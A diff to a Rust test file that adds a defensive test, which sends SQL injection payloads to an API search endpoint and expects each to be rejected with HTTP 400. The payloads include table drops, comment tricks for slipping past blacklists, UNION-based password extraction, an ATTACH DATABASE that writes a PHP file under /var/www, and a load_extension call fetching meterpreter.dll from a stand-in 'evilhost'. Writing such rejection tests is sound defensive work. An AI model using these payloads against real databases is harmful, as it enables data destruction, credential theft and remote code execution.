@@ -87,7 +87,7 @@ pub fn assert_bop_to_the_top(list: &List) {
 #[test]
 fn test_search() {
     let Some(url) = get_url(
-        "/api/items?q=search&query=SELECT%20name,%20user_wins%20,user_losses%20FROM%20item",
+        "/api/items?q=search&query=SELECT%20name,%20user_wins,%20user_losses%20FROM%20item",
     ) else {
         return;
     };
@@ -102,6 +102,33 @@ fn test_search() {
         compute::sum(arrays[1].as_primitive::<UInt64Type>()),
         compute::sum(arrays[2].as_primitive::<UInt64Type>()),
     );
+}
+
+#[test]
+fn test_sql_injection() {
+    for url in [
+        // https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
+        "/api/items?q=search&query=DROP sampletable;--",
+        "/api/items?q=search&query=SELECT * FROM user WHERE user_id = 'admin'--' AND secret = 'password'",
+        "/api/items?q=search&query=DROP/*comment*/sampletable",
+        "/api/items?q=search&query=DR/**/OP/*bypass blacklisting*/sampletable",
+        "/api/items?q=search&query=SELECT/*avoid-spaces*/password/**/FROM/**/Members",
+        "/api/items?q=search&query=SELECT * FROM members; DROP members--",
+        "/api/items?q=search&query=SELECT * FROM products WHERE id = 10; DROP members--",
+        "/api/items?q=search&query=SELECT name, user_wins, user_losses FROM item UNION ALL SELECT * FROM user WHERE user_id = 'admin' AND secret = 'password'",
+        "/api/items?q=search&query=insert into users values( 1, 'hax0r', 'coolpass', 9 )/*",
+        "/api/items?q=search&query=' + (SELECT TOP 1 password FROM users ) + '",
+        // https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
+        "/api/items?q=search&query=select sqlite_version()",
+        "/api/items?q=search&query=SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'",
+        "/api/items?q=search&query=ATTACH DATABASE '/var/www/lol.php' AS lol",
+        "/api/items?q=search&query=SELECT 1,load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain')",
+    ] {
+        let Some(url) = get_url(url) else {
+            return;
+        };
+        assert_eq!(reqwest::blocking::get(url).unwrap().status(), 400);
+    }
 }
 
 fn get_url(path: &str) -> Option<String> {
